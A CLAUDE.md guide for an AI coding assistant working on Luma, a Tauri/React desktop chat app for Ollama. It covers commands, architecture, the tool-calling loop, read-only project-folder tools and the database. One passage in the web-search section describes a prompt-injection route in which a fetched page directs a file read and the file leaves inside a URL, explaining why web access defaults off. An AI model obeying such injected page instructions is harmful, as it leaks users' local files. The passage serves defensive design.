# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Commands

```bash
npm run dev        # Start Vite dev server + Tauri dev window (hot reload)
npm run build      # Vite production build → Tauri bundler
npm run dev:vite   # Vite dev server only (for browser-based dev)
npm run build:vite # Vite production build only
npm test           # Vitest in watch mode (jsdom, Tauri APIs mocked)
npm run test:run   # Vitest single run (use this in CI / pre-commit)
npm run test:rust  # Cargo tests for the Tauri backend
npm run test:all   # Both test suites sequentially
npm run lint       # cargo fmt --check + clippy --all-targets -- -D warnings. There is
                   # no JS linter — this is all of "the lint" for this repo.
npm run check      # lint + Vitest + `cargo check --all-targets`. The pre-push gate:
                   # `cargo check` is what catches a missing/renamed symbol, which
                   # `tauri dev`'s watcher only surfaces if it happens to rebuild.
```

### Prerequisites

- **Rust**: Install via [rustup](https://rustup.rs/) (`rustup stable`)
- **Tauri CLI**: `npm install` pulls `@tauri-apps/cli`
- **Icons**: Generate with `cargo tauri icon path/to/source.png` (1024x1024 recommended)
- **macOS/Xcode**: any link step fails with "You have not agreed to the Xcode license agreements" until `sudo xcodebuild -license accept` is run once. `cc --version` reproduces it in one line — don't go looking in the Rust code for it.

### Three `cargo test` failures that are not your fault

`test_load_sessions_from_existing_db`, `test_session_serialization`, and `test_serialization_matches_frontend` read the **legacy Electron-era DB** (`dirs_next()` → `~/Library/Application Support/Luma`) and assert it has sessions. On a machine whose chats live in `app_data_dir()` (`com.luma.chat`), that legacy file has 0 rows, so they fail on `sessions[0]` / `!sessions.is_empty()` regardless of the code. Everything else in `cargo test` passing is the signal; these three are environment-dependent. `ci.yml` skips exactly these three by name (they fail on any clean machine, so CI can still run the suite).

## Architecture

**Luma** is a dual-pane Ollama chat desktop app (Tauri + React/Vite + SQLite).

### Process boundary

- **Rust backend** (`tauri/`): owns the SQLite DB (via `rusqlite`), window controls, and all network I/O (web search/fetch via `reqwest` + `scraper` + `readability`), exposed via Tauri commands.
- **Frontend** (`src/`): React UI, calling the backend through `@tauri-apps/api/core` → `invoke()`, wrapped in `src/lib/db.js` / `src/lib/tools.js`.
- **All Ollama API calls go through Rust Tauri commands** (`src/lib/ollama.js` proxies via `invoke()` to avoid CORS in production WebView2 builds) — don't reintroduce the `ollama` npm package.

### Rust backend structure

| File | Purpose |
|---|---|
| `tauri/src/main.rs` | Binary entry point — six lines calling `luma_lib::run()` |
| `tauri/src/lib.rs` | `run()`: Tauri `Builder` setup (resolves `app_data_dir`, `manage()`s `Database` + `CancelRegistry`), plugin init, and the `tauri::generate_handler![]` command registration |
| `tauri/src/db.rs` | SQLite schema, migrations, all CRUD operations |
| `tauri/src/commands.rs` | Tauri `#[tauri::command]` handlers wrapping DB + web tools |
| `tauri/src/tools/search.rs` | DuckDuckGo web search (HTTP → HTML parsing) |
| `tauri/src/tools/fetch.rs` | Web page fetch + Readability extraction. Body is streamed with a 2 MB cap (`MAX_HTML_BYTES`) — don't revert to `res.text()` (unbounded buffering). Fallback `strip_tags` uses `to_ascii_lowercase` (not `to_lowercase`) so byte offsets stay aligned for slicing. |
| `tauri/src/tools/ollama_search.rs` | Ollama cloud web search/fetch (key-gated); mirrors the DuckDuckGo output shape |
| `tauri/src/tools/html.rs` | HTML → Markdown text conversion |
| `tauri/src/tools/mod.rs` | Module re-exports |

New commands: add the function in `commands.rs` and register it in `lib.rs`'s `tauri::generate_handler![]` (not `main.rs` — that file only calls `luma_lib::run()`).

### Frontend structure

| File | Purpose |
|---|---|
| `src/App.jsx` | Layout: TitleBar, Sidebar, main ChatPane, optional SidePanel, SettingsPage |
| `src/components/MessageBubble.jsx` | One chat bubble: edit mode, selection→"Ask in side chat" popup, thinking block, streaming cursor, follow-up subtopic chips (`SubtopicChips.jsx`). Markdown delegated to `MarkdownBody` |
| `src/components/MarkdownBody.jsx` | `<ReactMarkdown>` instance + plugins (GFM, math via `remark-math`) + per-tag `components` overrides styled with theme tokens. `buildMarkdownComponents(theme)` is unit-tested in isolation |
| `src/components/InputArea.jsx` | Textarea, image attachments, send/stop — single source of truth for the input box |
| `src/components/Sidebar.jsx` | Recent chats list, "New Chat" button, Ollama status |
| `src/components/SidePanel.jsx` | Side-chat tabs + `+` button to add a new tab |
| `src/lib/ollama.js` | `streamChat()` coordinates the tool-calling loop. `toolCallLimit` setting (0 = unlimited) caps rounds; once hit, the final round runs tools-disabled but keeps gathered tool results so the model still answers from them |
| `src/lib/ollamaStream.js` | Pure collaborators extracted from `streamChat`: `applyStreamLine` (parses one streamed JSON line), `normalizeToolCalls`, `systemMessagesForRound` (force-final/wrap-up/web-search-nudge policy), `buildRequestBody`, `stripLeakedToolCallXml`, `runToolCalls` (executes a batch, detects quota/all-failed) |
| `src/lib/tools.js` | `TOOLS` (Ollama-format definitions) + `FILE_TOOL_NAMES`/`WEB_TOOL_NAMES` + `executeTool(name, args, context)` dispatcher. `context.roots` is the attached project folders for the file tools — the model can never supply them. Coerces stringly-typed args (`"limit": "50"`) because a type mismatch would fail the whole invoke and count as a failed tool round |
| `src/lib/followups.js` | Follow-up subtopic generation: `buildFollowUpMessages` (focused JSON-only prompt) + `parseSubtopics` (robust extraction of ```json fences / prose-wrapped JSON, caps at 3) |
| `src/lib/db.js` | Thin `invoke()` wrappers for every Tauri DB command |
| `src/hooks/useStreamingChat.js` | Wires `streamChat` callbacks to store actions; creates the session on first message |
| `src/hooks/useDbInit.js` | Triggers initial SQLite → store hydration on app start |
| `src/hooks/useDragResize.js` | Shared drag-to-resize for the sidebar + side-panel width handles (`invert` flips drag direction) |

### State management (Zustand)

Independent stores, none persisted to `localStorage` (SQLite is the persistence layer). Selectors everywhere, so subscriptions only re-render for the slices they read.

| Store | File | Owns | Re-render triggers |
|---|---|---|---|
| `useMainChat` | `src/store/chatStore.js` | Per-pane messages, streaming state, tool call records, model, `chatNonce`, `projectRoots` | `messages`, `isStreaming`, `model`, `error` (not `abortController`) |
| `getSideChatStore(id)` | `src/store/chatStore.js` | Same factory as `useMainChat`, one store per side-chat tab, kept in a `Map` keyed by tab id (never recreated on tab switch) | Same as above |
| `useSessionStore` | `src/store/sessionStore.js` | Session list (incl. side-chat metadata), chat data write-through to SQLite | `chatSessions`, `activeChatId` |
| `useUiStore` | `src/store/uiStore.js` | Transient view state: side-chat open/closed, Ollama connectivity, settings page open, side-chat prefill text | All fields (small UI-only store) |
| `useSettingsStore` | `src/store/settingsStore.js` | Persisted settings (theme, default model, web search default, tool call limit, search provider, Ollama server URL + API key), write-through to SQLite | `hydrated` (one-shot), individual fields |

`chatStore.js` exports `createChatStore(id)`; both panes use the same factory. New chats start with an empty `model` — each store subscribes to `useSettingsStore` and lazily applies `defaultModel` once hydrated, so module-init doesn't depend on the DB being open.

Store actions write to SQLite (via `db`/`useSettingsStore`), not components.

### Streaming and tool-calling loop

`ollama_chat_stream` (`commands.rs`) checks `response.status().is_success()` before treating the body as an SSE stream — a non-2xx response (e.g. a 403 usage-limit hit) otherwise fell through the JSON-line parser and emitted an empty `ollama://done`. Non-success now emits `ollama://error` (401/403/429 get a usage-limit message). The reader buffers raw **bytes** and decodes each complete line lossily (`drain_complete_lines`): decoding a whole chunk instead means any chunk ending mid-codepoint — routine for non-ASCII output — fails `from_utf8`, and the old `Err(_) => continue` threw that chunk away, losing its JSON line and splicing two objects together when the dropped chunk held the newline.

The stream is cancellable mid-flight: `response.chunk()` races a `tokio::sync::Notify` (per `request_id`, in a `CancelRegistry` Tauri state) via `tokio::select!`. `ollama_cancel(request_id)` latches an `AtomicBool` and calls `notify_waiters()`, so Rust stops draining Ollama immediately instead of burning quota after Stop. A `CancelGuard` removes the registry entry on every exit path. On cancel, `ollama://done` fires with the partial content so far, and `streamChat`'s `abort` listener invokes `ollama_cancel`. A pre-cancel tombstone handles the race where Stop fires before `register()` runs; `requestId` is nulled after `done`/`error` resolve so a late Stop doesn't insert a tombstone for an already-finished request.

`streamChat()` sends the messages array, streams the response, and executes any `tool_calls` via `executeTool`, appending `role: "tool"` messages and re-calling the model. Hitting `toolCallLimit` triggers one final tools-disabled round that keeps prior tool results plus a system message telling the model to answer from what it found. A soft `maxToolRounds = 10` nudge and a fixed 15-round DuckDuckGo rate-limit nudge (`WEB_SEARCH_NUDGE_AT = 15` in `ollama.js`) inject "wrap up" system messages. Both key off the **round number** alone — `systemMessagesForRound` never checks which tools ran — so the DDG nudge fires even in a session that made no searches, and it fires before `maxToolRounds` if the two ever disagree. `Error: QUOTA:` from a web tool ends the stream immediately. Only a **non-empty** `tool_calls` array from a streamed chunk is kept — some models emit a trailing `tool_calls: []` that would otherwise wipe calls captured earlier in the round. A `normalizeToolCalls` JSON-parse failure sets `parseError` on the entry; `runToolCalls` short-circuits it to a descriptive error tool result instead of calling `executeTool` with empty args, so the model can retry.

`runToolCalls` executes a round's tool calls **concurrently**, capped at `TOOL_CONCURRENCY = 3` (`ollamaStream.js`) — a round of N web searches completes in ~max latency, not sum. The cap is the primary control for DDG rate-limiting (firing many concurrent DDG requests trips it faster than the same number sequential); `maxSearches` and the 15-round nudge are layered backstops. All `onToolCall(name, args, index)` callbacks fire **upfront in issue order** (so every in-flight indicator shows immediately), then `onToolResult(name, result, index)` and the `role: "tool"` appends happen **in issue order** after the batch settles — Ollama expects tool results in `tool_calls` order, so results are indexed by call position regardless of completion order. The `index` arg (3rd) is why `useStreamingChat` tracks in-flight calls in a `Map` keyed by index, not a single `currentCallId` — multiple calls overlap once parallelized.

A `maxSearches` budget (default 15, 0 = unlimited; `streamChat` param) counts `web_search` + `web_fetch` calls across all rounds **including failures** (a failed call still cost a network request). Once hit, it sets `limits.budgetExhausted`, and the next round becomes a tools-disabled force-final — reusing the same `forceFinal`/`FORCE_FINAL_MSG` path as `toolCallLimit` rather than a separate short-circuit. The budget can overshoot by at most one round's batch (≤3 calls) since it's checked after each round, not per call. `allFailed` (every call in a round errored) still forces a wrap-up next round; this is pre-existing and somewhat aggressive for a research tool (a single transient DDG hiccup ends the session) but left as-is — a follow-up could allow one retry round before wrapping. Note how it's computed: `runToolCalls` classifies a result as failed when it `startsWith("Error")` — the **bare word, no colon** — so a new tool's non-failure messages must not begin with `Error` at all, or a normal observation jumps the session to its wrap-up round. `Error: QUOTA:` is a separate exact-prefix check that ends the stream.

`think: true` (per-pane thinking toggle) makes Ollama stream reasoning in a separate `message.thinking` field. `streamChat` accumulates it across all rounds (unlike `content`, not reset per round) via `onThinking`; `MessageBubble` renders it in a collapsible block. It is **display-only but persisted** (`messages.thinking` / `side_chat_messages.thinking`) so a reloaded session still shows how an answer was reached — it is never sent back to the model: `getApiMessages()` strips it, so not even the parent's own later rounds see its earlier reasoning, and a side chat inherits the parent's *conclusions* (as prose in the context block) but none of the reasoning behind them. The rAF throttle means the last reasoning chunk is still pending when the stream ends, so `useStreamingChat` calls `flushPending()` on every exit path (done, abort, error) — cancelling that frame instead would write a hole into the persisted record.

**Follow-up subtopic chips** (`SubtopicChips.jsx`, rendered by `MessageBubble`): after `onDone` finalizes an answer, `useStreamingChat` fires a best-effort dedicated `streamChat` call (no tools, `think: false`, the pane's `ctrl.signal`) whose only job is to suggest 1–3 follow-up questions as JSON; `src/lib/followups.js` builds the focused prompt and robustly parses the result, and `chatStore.setSubtopics` attaches the chips to the message. Clicking a chip sends its `prompt` as the next user message in the current pane via `ChatPane`'s `onFollowUp` (`isStreaming ? null : onSend`). **This is a dedicated call, NOT a `suggest_subtopics` tool** — verified against `deepseek-v4-flash` with real Ollama web search that the model won't reliably call a side-effect tool on follow-up turns (it skips it in favor of writing prose after web-search rounds, even with a strengthened nudge), but a focused single-purpose call produces 1–3 subtopics on every turn. Subtopics are **transient** (not persisted to SQLite, unlike `thinking`) — they vanish on reload. The call is fire-and-forget and swallows all errors (chips are progressive enhancement; a failed call just renders no chips).

### Tool execution

`src/lib/tools.js` exports `TOOLS` + `executeTool(name, args)`. Local tools (e.g. `get_current_time`) run in the renderer; web tools (`web_search`, `web_fetch`) invoke Tauri commands (CORS), implemented in `tauri/src/tools/`.

Web search has a global default in `useSettingsStore` (`webSearchDefault`, **off** by default); the per-pane toggle in `ChatPane` seeds from it as a session override. `useStreamingChat` filters web tools out of `TOOLS` when the toggle is off. **In Codebase mode the default is off whatever the setting says**: file reads plus web access is the egress pair (a fetched page can order a file read, and a file can leave inside a URL), so `ChatPane` re-derives the toggle when the root set changes, and turning web search back on mid-codebase is a deliberate act. `ChatPane` derives `codebase` exactly as `useStreamingChat` does — the pane's roots, else its session's — because a side chat has no roots of its own and the two must agree or the default silently doesn't apply.

### Codebase mode (read-only project research)

Attaching a project folder turns a session into Codebase mode. **Mode is derived, not stored**: `sessions.project_roots IS NOT NULL` means codebase, so attaching a folder is the only switch — there's no `mode` column, no per-pane toggle, and no default-mode setting. Detaching returns the pane to chat. Side chats inherit it (they read their session's roots via the fallback in `useStreamingChat`) and have no control of their own.

`tauri/src/tools/fs.rs` owns the whole feature: `read_file(path, root?, offset?, limit?)`, `search_code(query, root?, path?, glob?, output?, regex?, no_ignore?)`, `list_dir(path?, root?)`, plus `validate_project_root`. Pure functions over `&[PathBuf]` (no Tauri context) so the guard is unit-testable; `commands.rs` only adds `spawn_blocking` (the first `spawn_blocking` in the repo).

- **`search_code` declared `root` only after the agent log proved it was needed.** The plan withheld it ("six parameters already, a seventh costs reliability"); the log showed the model sending it unprompted because its siblings take it, Tauri silently dropping the unknown argument, and the search then resolving against the primary — four rounds spent on one `Not found` (`logs/agent.jsonl`). Declaring it also closed the real gap: scoping a search into a secondary folder was impossible, since `path` resolves against a single root.

- **The root set is the security boundary.** Paths are relative only and resolve against **one** root — the primary, or the one the call names with `root` (matched by alias, case-insensitively; all three file tools take it, and `search_code` uses it to scope a sweep to one folder as well as to resolve its `path`). A flat namespace would be ambiguous, so a secondary root is never guessed at; an unknown `root` is an observation listing the real aliases, not a silent fallback. Then Rust joins to that root, canonicalizes *both* the root and the target, and checks component-wise `Path::starts_with`. `validate_project_root` gates attaching, and the same denylist (`fs.rs`'s `refused_as_root`: `/`, `$HOME`, `$HOME`'s parent, a file, Luma's own data dir and any ancestor of it) is **re-applied on every call** by `commands.rs`'s `roots_to_paths` — the DB is not a trusted source for a root, because `import_chats` writes a backup's roots straight into it. That per-call check is `is_refused_root`, not `validate_root`: a root restored on another machine legitimately points at a folder that isn't here, and has to be *kept* (the UI marks it missing), so the check can't require existence. `RootSet::new` also drops the filesystem root and overlapping roots (first attached wins).
- **Aliases are the addressing scheme.** `RootSet::alias` is the folder's basename, qualified by its *parent* only when two attached folders share one (`work/api` vs `personal/api`), and it is what both `root` and the multi-root result labels (`web:src/app.ts`) are matched against and rendered from. `src/lib/systemPrompt.js`'s `rootAliases` mirrors the rule for the one place the model can learn the names up front — the tool schemas are static, so the prompt is where they're listed (never the absolute paths).
- **A `Not found` names the folder that does have the file.** `resolve` checks the other attached roots for the same relative path and, if it's there, says so (`... does exist under pos-backend — pass that as root to reach it`). It's the wording that turns a path-format hunt into a one-round correction; with a single root the message is unchanged, and the check is a couple of `exists()` calls that never widen access (following the hint re-runs the full guard).
- **Observations vs `Error:`** — see the `Error` prefix note in the streaming section. Expected path failures (not found, symlink escape, binary, past EOF, timeout, **a directory handed to `read_file`**) return as plain observations so `allFailed` doesn't trip. That last one is a real trap: on Unix `File::open` opens a directory happily and only fails later with `EISDIR`, which surfaces as an infrastructure `Error:` unless you `metadata().is_dir()` first. `fs.rs`'s module docs spell this out; keep it that way for new tools.
- **Caps are applied before loading**, never `read_to_string` then truncate: per-line 2000 chars, 2000 lines, ~150 KB per read result; search caps 20/file and 100 total. `read_file` emits `{line}→{text}` with real line numbers and a `continue with offset=N` notice. Past the requested window it reads on only for the notice's line count, so the deadline has to **end the read** (the notice degrades to "more than N lines") — otherwise a multi-GB log is streamed to EOF for one sentence. Lines are decoded only when emitted, and **lossily**: a stray byte before `offset`, or a multi-byte character cut in half by the per-line cap, must not fail a read whose window is fine, so the NUL peek is the only thing that refuses a file.
- **Listings carry file sizes** (`search_code`'s `files` mode and `list_dir`, via `human_size` in `fs.rs`). This is load-bearing, not cosmetic: a model that can see a file is large pages it with `offset`/`limit`, and one that cannot reads it whole — a single unpaged read was 56% of a run's byte budget. Measured against `deepseek-v4.1-flash`, the same listing read `app/models/ticket.rb` **unpaged** with a bare filename, **paged** it (`limit: 200`) with `(84 KB)` beside it, and read it **unpaged** again with a bare `[large]` marker — so the number is what works and a qualitative hint is worse than useless. Don't simplify it to a boolean. The size costs a stat only for files that survive the caps (at most `SEARCH_MAX_TOTAL` of them), never for the whole walk; line counts would require reading every file and were not needed.
- **Search uses ripgrep's libraries** (`ignore` + `grep-searcher` + `grep-regex`), literal by default with `regex::escape`, smart-case, `.gitignore` respected unless `no_ignore` (which also includes hidden files). It sets `require_git(false)` so a folder's own `.gitignore` applies even outside a checkout, and `parents(false)` so ignore files *above* the attached folder don't. Results are sorted by path (`WalkBuilder::sort_by_file_path`) so a capped result set is deterministic instead of readdir-ordered, and `content`/`files` **break the walk** once the cap is full rather than opening every remaining file until the deadline (which would also add a bogus "timed out" notice). Walk timeout is checked **inside** the loop (partial results + notice), never by abandoning a running thread.
- **`search_code`'s description teaches regex as an outline, not just a pattern matcher** — "an anchored pattern for the definitions you want — in Ruby, lines beginning with class, module, def, has_many or belongs_to". That sentence is the only thing between the model and a full-file read for a comprehension question, because the model never reaches for `regex: true` unprompted. Measured against `deepseek-v4.1-flash`, asked "what is a Ticket" with an 84 KB `app/models/ticket.rb` in the results: with the old description it read **140 lines** of the file; with the sentence added it called `search_code {regex: true, path: "app/models/ticket.rb"}` with a pattern it wrote itself (`^\s*(class|module|def|has_many|belongs_to|has_one|scope|enum|validates|before_|after_|attr_)`) and read by range instead. Don't drop it as prose — it's doing load-bearing work.
- **Loop policy differs in Codebase mode** (`useStreamingChat` passes these to `streamChat`): `maxToolRounds: 20`, `webSearchNudgeAt: null` (the round-15 DuckDuckGo nudge fires on the round number alone, so it would otherwise interrupt repo reading), `maxFileCalls: 60`, `maxFileBytes: 150000`. `toolCallLimit` is unchanged — no separate hard cap, the budgets bound the spend. Call count is the *second* line of defence and was raised from 40 when listings started reporting sizes: paging trades byte pressure for call pressure (a full 150k-byte sweep in ~200-line pages is ~19 reads, and searches share the budget), so the two numbers have to move together. The byte budget is what actually bounds read spend; **a run that now trips on calls rather than bytes means `maxFileCalls` is still too low**, and a run still tripping on bytes means the listings aren't reaching the model.
- `numCtx` and `temperature` are persisted settings (both were hardcoded in `buildRequestBody`). **Codebase mode sizes `num_ctx` itself**, in `src/lib/modelContext.js`: two signals doing two jobs — the `cloud` tag suffix decides *permission to raise* (cloud context is ollama.com's memory; a local model's is the user's VRAM, where a big KV cache means CPU offload or a model that won't load), and the model's real window from `ollama_model_context` (`/api/show` → `model_info['<arch>.context_length']`) decides *the ceiling*, capped at `CODEBASE_MAX_CTX` (65536). It only ever raises, never lowers, and an unreadable window means no raise — exceeding the trained length degrades quality silently via RoPE scaling rather than erroring. `stream.start` in the agent log records the resolved `numCtx`, the setting it came from, and the window. Attaching while `ollamaUrl` isn't loopback shows a one-time notice that file contents leave the machine (`projectRemoteNoticeAck`).

### Agent log (tuning the harness)

`src/lib/agentLog.js` writes a structured **JSONL** record of what the agent loop did — opt-in via the `agentLogEnabled` setting (Settings → Agent log), a no-op object when off. The log is the only way to tune the loop from evidence: it captures the harness's *decisions* (the prompt, the tools offered, which policy message fired on which round, the resolved limits) alongside the model's behaviour (per-round content/thinking sizes and latency, every tool call with args, verdict, timing and result size, budget counters) and the reason each run ended.

- **Rust only appends.** `append_agent_log(lines)` / `agent_log_path()` / `clear_agent_log()` in `commands.rs` are dumb: the frontend hands over already-serialized lines, so a new event type needs no backend change. Written to `<app_data_dir>/logs/agent.jsonl`, rotated to `agent.1.jsonl` past 5 MB.
- **Events** (`t`): `limits`, `stream.start`, `round.start` (with `injected`, naming the policy message via `messageKind`), `round.reply` (with `doneReason` — Ollama's `stop` vs `length`, the only way to tell a truncated answer from a short one — and `includeTools`, which is what distinguishes "the model chose no tools" from "tools were stripped for the forced-final round"), `tool`, `round.end`, `stream.end` (always written, from the loop's `finally`, with `reason`: `final` / `quota` / `abort` / `error`), `stream.error`, `subtopics`.
- **Every line carries a `runId`**, minted per logger and therefore per run, because `round` restarts at 0 each run — grouping or diffing runs is otherwise positional. `done_reason` rides on the same stream line as Ollama's final chunk, so it arrives without a backend change.
- **Flushes per round**, not per event, and swallows its own write errors — logging must never fail a chat turn.
- **Results are summarised, never copied**: `chars` + head 400 + tail 200. The tail is deliberate — `read_file` puts its "continue with offset=N" notice at the *end*. Roots are logged by basename, not absolute path, since the file may be shared.
- `classifyToolResult` (ollamaStream.js) is exported so the log reports the same verdict the loop acted on.

### Database schema

`tauri/src/db.rs` owns schema + queries (SQLite via `rusqlite`, synchronous). Tables: `sessions`, `messages`, `side_chats`, `side_chat_messages`, `custom_models`, `settings` (key/value; well-known keys in `SETTING_KEYS`, `src/store/settingsStore.js`). Message rows store `images`/`tool_calls` as JSON strings and `thinking` as plain text (display-only; `getApiMessages` never sends it), and `sessions.project_roots` holds a JSON array of attached project folders (`NULL` = an ordinary chat session). Roots have their own `set_project_roots` command so a title/model edit can never clobber them, and `import_all` merges them with `COALESCE(local, backup)`.

Migrations use SQLite's `PRAGMA user_version`: `MIGRATIONS` in `db.rs` is an ordered array of steps, and `run_migrations()` only runs steps above the DB's current version, then advances it — so each step runs at most once. New schema changes: append a step, wrapped in `.ok()`; never edit or reorder existing steps (their position is their version number).

`save_messages`/`save_side_chat_messages` delegate to `sync_messages()`: one transaction that upserts by id (`ON CONFLICT … WHERE <field differs>`, so unchanged rows aren't rewritten) and deletes ids no longer present (persists truncate-after-edit). Replaces an earlier non-atomic DELETE-all + reinsert. Frontend API unchanged — callers send the full desired message list.

**DB location.** `Database::new(dir)` opens `luma.db` in the given dir; the dir comes from Tauri's `app_data_dir()`, resolved in `.setup()` in `tauri/src/lib.rs` (needs the `AppHandle`, so can't run before `tauri::Builder`). `migrate_legacy_db()` copies over an old Electron-era `luma.db` when the new DB is absent/empty (never clobbers real data). Don't read `useSettingsStore` at module init — same reason: the store isn't available before the Tauri/app context is ready.

### Chat backup / restore

`export_chats(path)`/`import_chats(path)` (`commands.rs`) back up **chat data only** (sessions, messages, side chats) — no settings/custom models/API keys. File format is a custom `.lumabackup` container: 4-byte magic (`LMBK`) + 1-byte version + gzip-compressed compact JSON (via `flate2`, already pulled in transitively by `reqwest`). `encode_backup`/`decode_backup` are pure functions (no `State`) for unit testing without a Tauri context. `import_all` preserves the backup's original `created_at`/`updated_at` (unlike `save_session`, which stamps "now") and upserts by id — it's a restore/merge, not additive-only. Project roots are part of that merge: a session already attached on this machine keeps its own (real, existing) folders, and one with no attachment adopts the backup's — which is the cross-machine case, where those paths usually don't exist and get marked missing in the UI instead of failing the import.

Frontend uses `@tauri-apps/plugin-dialog`'s `save()`/`open()` for the native picker, then passes the path to the Tauri commands which do the file I/O via `std::fs`.

### Window controls

`src/components/TitleBar.jsx` uses `@tauri-apps/api/window` → `getCurrentWindow()` for minimize/maximize/close. Tauri v2 runs `decorations: false` (frameless) — the app draws its own title bar.

### Theming

`src/theme.js` holds the `dark`/`light` palettes (`getTheme(name)`) and sets `data-theme` on `<html>`; `src/index.css` mirrors the same tokens as CSS custom properties. CSS Modules for scoped styles — no Tailwind.

`index.css`'s global `*{margin:0;padding:0}` reset strips list indentation, so `ul`/`ol`/`li` need explicit padding overrides in `MarkdownBody.jsx`.

**All markdown element styling lives in the `components` prop of `<ReactMarkdown>` in `MarkdownBody.jsx` (inline styles), not CSS** — the `.markdown-body …` block in `index.css` is dead (the component uses the hashed `styles.markdownBody` class instead). `table` uses `table-layout: fixed` + `width: 100%`; `th`/`td` use `word-break: normal` / `overflow-wrap: break-word` (not `word-break: break-word`, which splits letter-by-letter) so long cell content wraps within its column instead of overflowing into the next one. To style a new tag, add it to the `components` prop, not the dead CSS rules.

### Math rendering

Math uses `remark-math` + `MathSpan` (`src/components/MathSpan.jsx`) + `temml` (not KaTeX/MathJax). `remark-math` only recognizes `$...$`/`$$...$$`, not the `\( \)`/`\[ \]` delimiters most models emit (CommonMark strips the backslash before any renderer sees it). `src/lib/mathDelimiters.js`'s `normalizeMathDelimiters()` rewrites both bracket forms to `$$...$$` before the string reaches `remark`, skipping fenced code blocks.

`MarkdownBody.jsx` passes `{ singleDollarTextMath: false }` to `remarkMath` so ordinary currency text (`$40`, `$0.40`) isn't misread as inline math — `normalizeMathDelimiters()` must keep emitting `$$...$$` (never single `$`) to stay consistent with that.

`temml/dist/temml.mjs` has only a default export — import as `const { default: temml } = await import(...)`. `MathSpan` calls `temml.renderToString()` directly (its bundled `renderMathInElement` depends on a `window.temml` global it doesn't set itself, so avoid it).

`src/App.jsx` preloads the Temml chunk via `requestIdleCallback` (falls back to `setTimeout` for older WKWebView) after mount, so the first math message doesn't pay the ~200KB chunk cost.

### Code splitting / lazy loading

`SidePanel` and `SettingsPage` are `React.lazy()`-wrapped at module scope (so the resolved module is cached and later mounts skip the Suspense flash). Both only ever mount from an explicit user action, never during boot.

Don't lazy-load something that can appear in the *initial* render (e.g. hydrated/restored state) — `ToolActivity` was tried and reverted because historical tool-call bubbles from a restored session mount immediately at launch, causing a visible flash. Also don't lazy-load components needed on every hot-path render (`MarkdownBody`, `ReactMarkdown`, `remark-gfm`) or `App` itself from `main.jsx` — no caching win for a local Tauri bundle, just an extra async hop.

Theme persistence lives in SQLite via `useSettingsStore`. An inline `<script>` in `index.html`'s `<head>` sets `data-theme` synchronously before React mounts (from legacy `localStorage`, else `prefers-color-scheme`) to avoid a flash; `useSettingsStore.hydrate()` then re-applies the authoritative SQLite value.

## Common tasks

Concrete entry points for changes that come up often. Skim this list before grepping.

- **Focus the input box** — `textareaRef` in `InputArea.jsx`. The `focusNonce` effect skips the initial mount (so main chat doesn't steal focus on boot), which also swallows a `bumpFocus()` that fires before a new `InputArea` mounts. Side chat panes instead pass `autoFocus={isSideChat}`, since a side chat's `InputArea` only mounts when the tab is created.
- **Auto-scroll on new content** — `messages.length` watcher in `ChatPane.jsx`, using `prevMessagesCountRef` to distinguish new messages from in-place streaming updates. Needs `requestAnimationFrame` since the new message isn't mounted yet when the effect fires.
- **Per-pane toggle (web search, thinking)** — local `useState` in `ChatPane`, re-derived from its default on `chatNonce` change, with a `*TouchedRef` (cleared per `chatNonce`) preserving manual overrides within a chat. Web search gates on settings `hydrated`; thinking derives from the model.
- **Reset a chat's per-pane state** — bump `chatNonce` (`clearMessages`/`loadMessages` already do). Per-chat-default effects should watch `chatNonce`, not `model`.
- **Add a new Tauri command** — add to `commands.rs`, register in `lib.rs`'s `generate_handler![]`, mirror a wrapper in `src/lib/db.js`/`src/lib/tools.js`. For long-running streams, follow the `ollama_chat_stream` event pattern (`ollama://chunk`/`done`/`error`, keyed by `request_id`).
- **Add a new persisted setting** — add to `SETTING_KEYS` in `settingsStore.js`; write-through to SQLite is automatic. Schema changes: append a `MIGRATIONS` step in `db.rs` (never edit/reorder existing ones).
- **Ollama server URL + API key** — `ollamaUrl`/`ollamaApiKey` in `useSettingsStore`, passed to `ollama_reachable`/`ollama_list_models`/`ollama_chat_stream` as `ollama_url`/`api_key` (fallback via `resolve_ollama_base()`). `ollamaApiKey` is unified across the remote-server bearer token and the web search API.
- **Add a new tool the model can call** — schema in `TOOLS` (`src/lib/tools.js`) + a case in `executeTool`. Web tools must run as Tauri commands (CORS); local tools run in the renderer. Read-only file tools belong in `tauri/src/tools/fs.rs` and must return expected failures as **observations**, never `Error:`-prefixed strings (see the `allFailed` note above).
- **Attach a project folder (Codebase mode)** — `ChatPane`'s folder button → `open({ directory: true, multiple: true })` → `db.validateProjectRoot` per pick (Rust gates `/`, `$HOME`, Luma's data dir) → append to `store.setProjectRoots` (pane) + `sessionStore.setProjectRoots` (persisted). Attaching **appends**: every folder gets its own header chip, each chip detaches only itself, and a refused pick is reported without discarding the accepted ones. `chatStore.loadMessages` takes the session's roots so switching sessions can't leak one project into the next; a side chat reads its session's instead. `numCtx` needs to be ≥32768 for this to be useful.
- **Add a native save/open file dialog** — `@tauri-apps/plugin-dialog`'s `save()`/`open()` for the path, then a plain Tauri command doing `std::fs` I/O (see `export_chats`/`import_chats`). Add permissions to `tauri/capabilities/default.json`.
- **Add a copy button to markdown code blocks** — the `code` override inside `buildMarkdownComponents` in `MarkdownBody.jsx` is the place. Because the override now uses React hooks (`useState` for copied feedback), `MarkdownBody` must memoize the `components` object with `useMemo(..., [theme])` so React doesn't treat it as a new component type on every render. Add `paddingRight` to the `<pre>` so the button doesn't overlap long single-line code.
- **Add a test** — Vitest + jsdom, Tauri APIs mocked in `src/test/setup.ts`, matching `src/**/*.test.{js,jsx,ts,tsx}`. Prefer `npm run test:run` over `npm test`.
- **Delete a side chat** — trash button in `ChatPane`'s header, two-step confirm like `Sidebar`'s `SessionRow`. Calls `removeSideChat(sessionId, sideChatId)`, which must also call `deleteSideChatStore(id)` to evict the tab's store from `_sideChatStores`. Children of a deleted side chat aren't cascade-deleted — they become top-level orphans. If the deleted tab was active, the next active tab is the parent (if it still exists) or the last remaining tab in array order — never `remaining[0]`.
